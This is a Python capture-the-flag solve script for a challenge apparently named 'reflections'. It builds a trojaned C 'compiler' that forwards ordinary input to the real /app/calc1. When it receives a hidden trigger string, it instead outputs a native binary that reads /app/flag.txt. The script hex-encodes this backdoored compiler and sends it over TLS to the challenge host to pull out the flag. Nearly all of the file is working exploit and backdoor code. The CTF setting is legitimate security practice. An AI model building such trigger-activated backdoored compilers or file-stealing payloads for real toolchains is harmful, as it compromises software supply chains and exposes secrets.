#!/usr/bin/env python3
import re
import shutil
import subprocess
import tempfile
from pathlib import Path

from pwn import remote


HOST = "reflections.opus4-7.b01le.rs"
PORT = 8443

STAGE2_TRIGGER = b"THIS_IS_STAGE2_TRIGGER\n"


def build_stage1_compiler():
    work = Path(tempfile.mkdtemp(prefix="reflections_"))
    gcc = shutil.which("gcc")
    if not gcc:
        raise RuntimeError("gcc not found")

    # Stage 2 payload: native ELF that reads /app/flag.txt and prints it.
    flagdump_c = r'''
#include <fcntl.h>
#include <unistd.h>

int main(void) {
    char buf[256];
    int fd = open("/app/flag.txt", O_RDONLY);
    if (fd < 0) return 1;

    int n = read(fd, buf, sizeof(buf));
    if (n < 0) return 1;

    int off = 0;
    while (off < n) {
        int w = write(1, buf + off, n - off);
        if (w <= 0) return 1;
        off += w;
    }
    return 0;
}
'''
    flagdump_c_path = work / "flagdump.c"
    flagdump_bin_path = work / "flagdump"
    flagdump_c_path.write_text(flagdump_c)

    subprocess.run(
        [gcc, "-O2", "-s", str(flagdump_c_path), "-o", str(flagdump_bin_path)],
        check=True,
    )

    flagdump_bytes = flagdump_bin_path.read_bytes()
    payload_array = ",".join(str(b) for b in flagdump_bytes)
    trigger_array = ",".join(str(b) for b in STAGE2_TRIGGER)

    # Stage 1 malicious compiler:
    # - if input == STAGE2_TRIGGER, emit the flagdump ELF
    # - otherwise, behave like the original calc1 compiler by proxying to /app/calc1
    compiler_c = f'''
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static const unsigned char trigger[] = {{{trigger_array}}};
static const size_t trigger_len = sizeof(trigger);

static const unsigned char payload[] = {{{payload_array}}};
static const size_t payload_len = sizeof(payload);

int main(void) {{
    size_t cap = 4096;
    size_t len = 0;
    unsigned char *buf = malloc(cap);
    if (!buf) return 111;

    while (1) {{
        ssize_t n = read(0, buf + len, cap - len);
        if (n < 0) return 112;
        if (n == 0) break;
        len += (size_t)n;

        if (len == cap) {{
            cap *= 2;
            unsigned char *tmp = realloc(buf, cap);
            if (!tmp) return 113;
            buf = tmp;
        }}
    }}

    if (len == trigger_len && memcmp(buf, trigger, trigger_len) == 0) {{
        size_t off = 0;
        while (off < payload_len) {{
            ssize_t n = write(1, payload + off, payload_len - off);
            if (n <= 0) return 114;
            off += (size_t)n;
        }}
        return 0;
    }}

    int p[2];
    if (pipe(p) != 0) return 115;

    pid_t pid = fork();
    if (pid < 0) return 116;

    if (pid == 0) {{
        dup2(p[0], 0);
        close(p[0]);
        close(p[1]);
        execl("/app/calc1", "/app/calc1", (char *)NULL);
        _exit(127);
    }}

    close(p[0]);

    size_t off = 0;
    while (off < len) {{
        ssize_t n = write(p[1], buf + off, len - off);
        if (n <= 0) {{
            close(p[1]);
            int st;
            waitpid(pid, &st, 0);
            return 117;
        }}
        off += (size_t)n;
    }}

    close(p[1]);

    int st = 0;
    waitpid(pid, &st, 0);

    if (WIFEXITED(st)) return WEXITSTATUS(st);
    return 118;
}}
'''
    compiler_c_path = work / "compiler.c"
    compiler_bin_path = work / "compiler"
    compiler_c_path.write_text(compiler_c)

    subprocess.run(
        [gcc, "-O2", "-s", str(compiler_c_path), "-o", str(compiler_bin_path)],
        check=True,
    )

    return compiler_bin_path.read_bytes()


def to_calc1_hex(data: bytes) -> bytes:
    return data.hex().encode() + b"\n"


def extract_flag(output: bytes):
    text = output.decode("latin1", errors="ignore")

    m = re.search(r"bctf\{[^}\r\n]*\}", text)
    if m:
        return m.group(0)

    m = re.search(r"Got:\s*([0-9a-fA-F]+)", text)
    if m:
        hx = m.group(1)
        try:
            raw = bytes.fromhex(hx)
            m2 = re.search(rb"bctf\{[^}\r\n]*\}", raw)
            if m2:
                return m2.group(0).decode()
        except Exception:
            pass

    for hx in re.findall(r"[0-9a-fA-F]{8,}", text):
        if len(hx) % 2:
            continue
        try:
            raw = bytes.fromhex(hx)
        except Exception:
            continue
        m = re.search(rb"bctf\{[^}\r\n]*\}", raw)
        if m:
            return m.group(0).decode()

    return None


def main():
    stage1_bin = build_stage1_compiler()
    stage1_source = to_calc1_hex(stage1_bin)

    payload = stage1_source + b"&&\n" + STAGE2_TRIGGER

    io = remote(HOST, PORT, ssl=True)
    io.send(payload)
    io.shutdown("send")
    out = io.recvall(timeout=15)
    io.close()

    print(out.decode("latin1", errors="ignore"))

    flag = extract_flag(out)
    if flag:
        print(f"[+] Flag: {flag}")
    else:
        print("[-] Flag not found automatically.")
        print("    If you see 'Got: <hex>', decode that hex.")


if __name__ == "__main__":
    main()